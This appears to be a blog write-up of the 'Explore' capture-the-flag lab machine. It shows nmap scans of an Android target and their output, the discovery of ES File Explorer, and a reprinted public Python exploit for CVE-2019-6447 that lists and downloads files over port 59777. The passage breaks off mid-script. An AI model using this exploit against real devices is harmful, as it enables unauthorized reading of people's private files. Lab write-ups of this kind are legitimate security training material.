<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Explore Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/explore/" /><meta property="og:url" content="https://g2jz.github.io/posts/explore/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-29T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="Explore Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-02T22:37:27+02:00","datePublished":"2022-09-29T09:00:00+02:00","description":"Enumeration","headline":"Explore Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/explore/"},"url":"https://g2jz.github.io/posts/explore/"}</script><title>Explore Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Explore Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Explore Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664434800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 29, 2022 </em> </span> <span> Updated <em class="" data-ts="1664743047" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 2, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1951 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The first thing we will do is enumerate the open ports on the target machine. To do this, we are going to be using <a href="https://github.com/nmap/nmap">nmap</a>. The type of scan that we are going to use scans all the range of ports, filters the open ones, and uses the TCP Syn Port Scan method. We also disabled host discovery and DNS resolution to make the scan faster. The last thing is to export evidence to a file called <code class="language-plaintext highlighter-rouge">allPorts</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts 10.10.10.247
</pre></table></code></div></div><div file="enum/allPorts" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/allPorts"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Thu Aug  5 18:35:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.247
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.247 ()	Status: Up
Host: 10.10.10.247 ()	Ports: 2222/open/tcp//EtherNetIP-1///, 42135/open/tcp/////, 44729/open/tcp/////, 59777/open/tcp/////
# Nmap done at Thu Aug  5 18:36:04 2021 -- 1 IP address (1 host up) scanned in 13.50 seconds
</pre></table></code></div></div><p>Once we know the open ports on the machine, we can do a more exhaustive scan to detect the services that are running and their versions. We will export the results to the <code class="language-plaintext highlighter-rouge">targeted</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p2222</span>,42135,44729,59777 <span class="nt">-oN</span> targeted 10.10.10.247
</pre></table></code></div></div><div file="enum/targeted" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/targeted"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Thu Aug  5 18:36:38 2021 as: nmap -sC -sV -p2222,42135,44729,59777 -oN targeted 10.10.10.247
Nmap scan report for 10.10.10.247
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
44729/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:49:58 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Thu, 05 Aug 2021 16:49:58 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Thu, 05 Aug 2021 16:50:03 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:03 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????&lt;=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/5%Time=610C139D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44729-TCP:V=7.91%I=7%D=8/5%Time=610C139C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x200
SF:5\x20Aug\x202021\x2016:49:58\x20GMT\r\nContent-Length:\x2022\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\x
SF:20Precondition\x20Failed\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2016:49
SF::58\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\.
SF:0\x20501\x20Not\x20Implemented\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2
SF:016:50:03\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/plai
SF:n;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x20
SF:supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2016:50:03\x20GMT\r\nConte
SF:nt-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\
SF:nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:\
SF:x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDat
SF:e:\x20Thu,\x2005\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\x
SF:2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:
SF:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq,
SF:DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2005\x20Aug\x2
SF:02021\x2016:50:19\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\x
SF:20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?\
SF:0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSer
SF:verCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2005
SF:\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\x2054\r\nContent-
SF:Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\
SF:nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mstsh
SF:ash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Thu,\x2005\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\
SF:x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0e
SF:\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  5 18:38:20 2021 -- 1 IP address (1 host up) scanned in 102.39 seconds
</pre></table></code></div></div><p>We can see how ports 2222 (SSH), 42135 (ES File Explorer HTTP), 44729 (not identified) and 59777 (HTTP) are open.</p><p>We will start our enumeration with the 42135 and 59777 ports as they are both HTTP services and it is always a good point to start.</p><h3 id="web-server-on-port-42135"><span class="mr-2">Web Server On Port 42135</span><a href="#web-server-on-port-42135" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we access this port from the browser, we can see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum1.png" alt="Desktop View" width="200" height="400" data-proofer-ignore> <em>Not found on port 42135</em></p><p>It won‚Äôt give us much information, but we know that there is an HTTP server on that port, and we will keep this in mind.</p><h3 id="web-server-on-port-59777"><span class="mr-2">Web Server On Port 59777</span><a href="#web-server-on-port-59777" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we try to access the HTTP server on port 59777, we will see the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum2.png" alt="Desktop View" width="500" height="400" data-proofer-ignore> <em>Forbidden on port 59777</em></p><p>Like the web server on port 42135, it does not give us much information, so we will continue exploring further.</p><h3 id="es-file-explorer"><span class="mr-2">ES File Explorer</span><a href="#es-file-explorer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we remember the initial enumeration phase, <code class="language-plaintext highlighter-rouge">Nmap</code> identified port 42135 as the <code class="language-plaintext highlighter-rouge">ES File Explorer</code> application. This application is a very popular file explorer for <code class="language-plaintext highlighter-rouge">Android</code>, so we will search for any known vulnerabilities in the program. To do this, we will use <a href="https://github.com/offensive-security/exploitdb">SearchSploit</a>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/explore/enum3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>searchsploit</em></p><p>We can see how we have an arbitrary file read vulnerability in the <code class="language-plaintext highlighter-rouge">4.1.9.7.4</code> version of <code class="language-plaintext highlighter-rouge">ES File Explorer</code>. So we will download the exploit and start to examine how it works:</p><div file="exploits/50070.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="exploits/50070.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
</pre><td class="rouge-code"><pre><span class="c1"># Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">ast</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span> 
	<span class="k">print</span><span class="p">(</span><span class="n">f</span> <span class="s">"USAGE {sys.argv[0]} &lt;command&gt; &lt;IP&gt; [file to download]"</span><span class="p">)</span> 
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 

<span class="n">url</span> <span class="o">=</span> <span class="s">'http://'</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">':59777'</span>
<span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> 
<span class="n">cmds</span> <span class="o">=</span> <span class="p">[</span><span class="s">'listFiles'</span><span class="p">,</span> <span class="s">'listPics'</span><span class="p">,</span> <span class="s">'listVideos'</span><span class="p">,</span> <span class="s">'listAudios'</span><span class="p">,</span> <span class="s">'listApps'</span><span class="p">,</span> <span class="s">'listAppsSystem'</span><span class="p">,</span> <span class="s">'listAppsPhone'</span><span class="p">,</span> <span class="s">'listAppsSdcard'</span><span class="p">,</span> <span class="s">'listAppsAll'</span><span class="p">,</span> <span class="s">'getFile'</span><span class="p">,</span> <span class="s">'getDeviceInfo'</span><span class="p">]</span> 
<span class="n">listCmds</span> <span class="o">=</span> <span class="n">cmds</span><span class="p">[:</span> <span class="mi">9</span><span class="p">]</span>

<span class="k">if</span> <span class="n">cmd</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"[-] WRONG COMMAND!"</span><span class="p">)</span> <span class="k">print</span><span class="p">(</span><span class="s">"Available commands : "</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listFiles         : List all Files."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listPics          : List all Pictures."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listVideos        : List all videos."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listAudios        : List all audios."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listApps          : List Applications installed."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listAppsSystem    : List System apps."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listAppsPhone     : List Communication related apps."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listAppsSdcard    : List apps on the SDCard."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  listAppsAll       : List all Application."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  getFile           : Download a file."</span><span class="p">)</span> 
	<span class="k">print</span><span class="p">(</span><span class="s">"  getDeviceInfo     : Get device info."</span><span class="p">)</span> 
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 

<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">=================================================================="</span><span class="p">)</span> 
<span class="k">print</span><span class="p">(</span><span class="s">"|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |"</span><span class="p">)</span> 
<span class="k">print</span><span class="p">(</span><span class="s">"|                Coded By : Nehal a.k.a PwnerSec                 |"</span><span class="p">)</span> 
<span class="k">print</span><span class="p">(</span><span class="s">"==================================================================</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 

<span class="n">header</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span> <span class="p">}</span>
<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span><span class="p">,</span> <span class="s">"https"</span><span class="p">:</span> <span class="s">"https://127.0.0.1:8080"</span> <span class="p">}</span>

<span class="k">def</span> <span class="nf">httpPost</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span> 
	<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
    	<span class="s">"command"</span><span class="p">:</span> <span class="n">cmd</span>
	<span class="p">})</span> 
	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">header</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span> 
	<span class="k">return</span> <span class="n">ast</span><span class="p">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">keys</span><span class="p">):</span> 
	<span class="k">for</span> <span class="n">dic</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span> 
		<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span> 
			<span class="k">print</span><span class="p">(</span><span class="n">f</span> <span class="s">"{key} : {dic[key]}"</span><span class="p">)</span> 
		<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">)</span> 
		
<span class="k">def</span> <span class="nf">do_listing</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span> 
	<span class="n">response</span> <span class="o">=</span> <span class="n">httpPost</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> 
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">response</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
		<span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">keys</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">keys</span><span class="p">())</span> 
		<span class="n">parse</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">keys</span><span class="p">)</span> 
		
<span class="k">if</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">listCmds</span><span class="p">:</span> 
	<span class="n">do_listing</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> 
		
<span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="n">cmds</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> 

